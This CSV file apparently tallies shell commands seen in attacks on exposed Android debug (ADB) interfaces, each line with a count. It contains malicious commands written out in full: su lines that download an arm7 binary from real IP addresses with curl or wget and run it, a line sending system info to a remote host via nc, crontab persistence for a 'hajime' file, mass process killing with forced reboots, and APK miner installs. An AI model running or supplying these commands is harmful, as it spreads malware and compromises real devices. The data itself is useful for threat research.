input,count
chmod 777 /data/local/tmp,2
chmod 777 /data/local/tmp/arm3,2
chmod 777 /data/local/tmp/arm3/main,1
chmod 777 /data/local/tmp/arm6,3
chmod 777 /data/local/tmp/arm6/arm32,3
"echo ""ping""",5
"echo ""tbk / $(uname -a) / $(uname -r)"" | nc 45.135.193.4 1234;",1
echo $(export cmd=$(getprop ro.product.cpu.abi 2>/dev/null || echo unknown) && echo $cmd):$(which su 2>/dev/null || echo unavailable,1
echo '@reboot /tmp/hajime.txt' >> /etc/crontab,6
echo hello,4
exec pkill -f arm,469
exec sh -c 'for pid in /proc/*; do grep -q arm $pid/cmdline 2>/dev/null && kill $(basename $pid); done',116
for pid in $(ls /proc | grep '^[0-9]'); do exe=$(readlink /proc/$pid/exe 2>/dev/null); [[ $exe =~ \(deleted\)|/\.|dvrHelper|.*\..*\..* ]] && kill -9 $pid; done; reboot -f; reboot; init 6; shutdown -r now,1
getprop,1
"kill -9 $(ps -eo pid,%cpu,cmd --sort=-%cpu | awk 'NR>1 && $3 !~ /^(sh)/ && $2 > 15 && $1 != '$$' {print $1}'); kill -9 $(pgrep -f Cyber); kill -9 $(pgrep -f 3kuhgguhz4uhz); pkill -f /var/Cyber; pkill -f 3kuhgguhz4uhz",4
monkey -p com.example.backgroundservice -c android.intent.category.LAUNCHER 1 --pct-persist 100,2
monkey -p com.one.dive -v 500,2
monkey -p com.socks.agent -c android.intent.category.LAUNCHER 1,1
pidof com.one.dive,1
ping -c 1 45.221.98.118; ,3
ping -c 1 46.8.78.9; ,2
pkill -f $(pgrep -f locker.sh); kill -9 $(pgrep -f locker.sh); pkill -f sh; kill -9 sh,2
pkill arm3,2
pkill main,1
pm 'install' '/data/local/tmp/V1-Priv.Lob.apk',1
pm 'install' '/data/local/tmp/androidserv.apk',51
pm 'install' '/data/local/tmp/app-release.apk',788
pm 'install' '/data/local/tmp/app.apk',459
pm 'install' '/data/local/tmp/app2.apk',1
pm 'install' '/data/local/tmp/gg-app-debug.apk',2
pm 'install' '/data/local/tmp/tv1.apk',2
pm 'install' '/data/local/tmp/ufo.apk',1
pm 'uninstall' 'com.androld.servlces',4
pm 'uninstall' 'com.one.dive',5
pm 'uninstall' 'com.socks.agent',705
pm install /data/local/tmp/app-release.apk,1
pm install /data/local/tmp/tv.apk,111
pm install /data/local/tmp/ufo.apk,603
pm list packages,34
pm path com.google.home.tv,123
pm path com.ufo.miner,806
pm uninstall com.one.dive,1
ps -aux,2
ps | grep log,113
ps | grep rig,113
ps | grep trinity,742
ps | grep xig,141
rm '/data/local/tmp/app.apk' </dev/null,1
rm '/data/local/tmp/app2.apk' </dev/null,1
rm -f '/data/local/tmp/V1-Priv.Lob.apk',1
rm -f '/data/local/tmp/androidserv.apk',51
rm -f '/data/local/tmp/app-release.apk',788
rm -f '/data/local/tmp/app.apk',460
rm -f '/data/local/tmp/gg-app-debug.apk',2
rm -f '/data/local/tmp/tv1.apk',2
rm -f '/data/local/tmp/ufo.apk',1
rm -f /data/local/tmp/*.apk,853
rm -f /data/local/tmp/tv.apk,41
rm -f /data/local/tmp/ufo.apk,402
rm -f /tmp/*.apk,875
rm -rf /data/local/tmp/*,1111
rm /data/local/tmp/*.apk,490
rm /data/local/tmp/tv.apk,72
rm /data/local/tmp/ufo.apk,217
screencap /data/local/tmp/screenshot.png,1
"su -c ""cd /data/local || cd /tmp || cd /sdcard ; curl http://141.98.11.136/z/arm7 -O ;wget http://141.98.11.136/z/arm7; chmod 755 arm7 ; ./arm7 adb""",7
"su -c ""cd /data/local/; curl http://77.37.96.100/z/arm7 -O ;wget http://77.37.96.100/z/arm7; chmod 755 arm7 ; ./arm7 adb""",1
top -b -n 1,9
whoami,2
